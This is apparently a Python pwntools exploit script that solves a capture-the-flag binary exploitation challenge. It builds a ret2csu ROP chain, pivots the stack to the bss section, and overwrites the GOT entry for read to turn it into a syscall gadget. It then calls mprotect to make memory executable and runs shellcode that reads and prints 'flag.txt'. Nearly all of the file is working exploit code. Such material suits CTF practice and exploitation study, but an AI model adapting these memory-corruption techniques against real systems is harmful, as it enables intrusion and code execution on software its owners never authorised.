#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('main_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x4013bd
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#    0x00000000004013b0 <+64>:    mov    rdx,r14
#    0x00000000004013b3 <+67>:    mov    rsi,r13
#    0x00000000004013b6 <+70>:    mov    edi,r12d
#    0x00000000004013b9 <+73>:    call   QWORD PTR [r15+rbx*8]
#    0x00000000004013bd <+77>:    add    rbx,0x1
#    0x00000000004013c1 <+81>:    cmp    rbp,rbx
#    0x00000000004013c4 <+84>:    jne    0x4013b0 <__libc_csu_init+64>
#    0x00000000004013c6 <+86>:    add    rsp,0x8
#    0x00000000004013ca <+90>:    pop    rbx
#    0x00000000004013cb <+91>:    pop    rbp
#    0x00000000004013cc <+92>:    pop    r12
#    0x00000000004013ce <+94>:    pop    r13
#    0x00000000004013d0 <+96>:    pop    r14
#    0x00000000004013d2 <+98>:    pop    r15
#    0x00000000004013d4 <+100>:   ret

def init():
    global io

    io = start()


def ret2csu(edi, rsi, rdx, rbx, rbp, ptr, junk):
    csu_pop = 0x4013c6
    csu_call = 0x4013b0

    payload = flat([
        csu_pop,
        junk,
        0x0,
        rbp,
        edi,
        rsi,
        rdx,
        ptr,
        csu_call,
        junk,
        0x1,
        rsi,
        0x3,
        0x4,
        0x5,
        0x6
    ])

    return payload


def solve():

    ##############################################################################
    # Stage 1: Stack Pivot to bss section
    ##############################################################################
    
    offset = 40
    leave_ret = 0x40132d # leave; ret;
    data_addr = 0x404500 

    stack_pivot = ret2csu(0, data_addr, 0x500, 0, 1, exe.got['read'], b'a'*8)

    payload = flat({
        offset: [
            stack_pivot,
            leave_ret
        ]
    })

    io.send(payload)
    info("stack pivot to: %#x", data_addr)

    ##############################################################################
    # Stage 2: Overwrite the got of read to syscall
    ##############################################################################

    overwrite = ret2csu(0, exe.got['read'], 1, 0, 1, exe.got['read'], b'b'*8)

    ropchain = flat(
        [   
            b'a'*8,
            overwrite
        ]
    )

    """
    Future read calls are now a syscall gadget
    Also rax is the untouched on read return, so rax=0x1=SYS_write
    So we now call write() to set rax
    """

    ##############################################################################
    # Stage 3: Call write() to set rax to mprotect syscall number 
    ##############################################################################

    sys_number = 0xA
    set_rax = ret2csu(1, data_addr, sys_number, 0, 1, exe.got['read'], b'c'*8)
    
    ropchain += set_rax
 
    ################################################################################
    # Stage 3: Call mprotect() to make data_addr readable/writeable/executable (rwx)
    ################################################################################

    page_size = 4096
    data_page = data_addr & ~(page_size - 1)
    prot = 0x7
    size = 0x1000

    mprotect = ret2csu(data_page, size, prot, 0, 1, exe.got['read'], b'd'*8)

    ropchain += mprotect

    ################################################################################
    # Stage 3: Call shellcode: I'm doing sendfile(1, open('flag.txt', 0), 0, 0x100)
    ################################################################################

    sc_addr = data_addr + len(ropchain) + 8
    info("shellcode address: %#x", sc_addr)

    shellcode  =  asm('nop')*30
    shellcode +=  asm(shellcraft.open(b'flag.txt\x00', constants.O_RDONLY))
    shellcode +=  asm(shellcraft.sendfile(1, 'rax', 0x0, 0x100))
    shellcode +=  asm(shellcraft.exit(0))

    sleep(1)

    ropchain += p64(sc_addr)
    ropchain += shellcode

    io.send(ropchain)
    io.sendline(p8(0xf0))


    io.interactive()



def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()


